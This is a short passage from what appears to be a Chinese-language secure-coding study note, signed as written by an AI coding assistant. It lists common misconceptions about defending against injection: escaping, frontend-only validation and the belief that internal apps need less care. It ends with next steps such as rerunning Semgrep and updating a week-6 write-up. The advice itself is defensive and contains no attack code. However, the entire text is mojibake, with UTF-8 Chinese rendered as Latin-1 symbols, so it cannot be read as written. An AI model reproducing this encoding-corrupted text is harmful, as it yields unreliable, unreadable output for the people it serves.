- è½¬ä¹‰è§„åˆ™å¤æ‚ï¼Œå®¹æ˜“é—æ¼
- ä¸åŒæ•°æ®åº“/ç³»ç»Ÿè§„åˆ™ä¸åŒ
- äºŒæ¬¡æ³¨å…¥é—®é¢˜

âŒ **è¯¯åŒº2**: "å‰ç«¯éªŒè¯å°±å¤Ÿäº†"
- å‰ç«¯å¯ä»¥è¢«ç»•è¿‡ï¼ˆcurlã€Postmanç­‰ï¼‰
- å¿…é¡»åœ¨åŽç«¯ä¹ŸéªŒè¯

âŒ **è¯¯åŒº3**: "è¿™ä¸ªæ˜¯å†…éƒ¨åº”ç”¨ï¼Œä¸éœ€è¦è¿™ä¹ˆä¸¥æ ¼"
- å†…éƒ¨åº”ç”¨ä¹Ÿä¼šè¢«æ”»å‡»ï¼ˆå†…éƒ¨å¨èƒï¼‰
- å®‰å…¨ä¹ æƒ¯åº”è¯¥å…»æˆ

### ä¸‹ä¸€æ­¥

å®Œæˆè¿™äº›ä¿®å¤åŽï¼š
1. è¿è¡Œæµ‹è¯•ç¡®ä¿åŠŸèƒ½æ­£å¸¸
2. å†æ¬¡è¿è¡ŒSemgrepéªŒè¯ä¿®å¤
3. æ›´æ–°week6_writeup.md
4. æ€è€ƒå¦‚ä½•é˜²æ­¢ç±»ä¼¼é—®é¢˜ï¼ˆä»£ç å®¡æŸ¥ã€è‡ªåŠ¨åŒ–å·¥å…·ï¼‰

---

> **æœ€åŽæ›´æ–°**: 2026-01-08
> **ä½œè€…**: Claude (AI Coding Assistant)
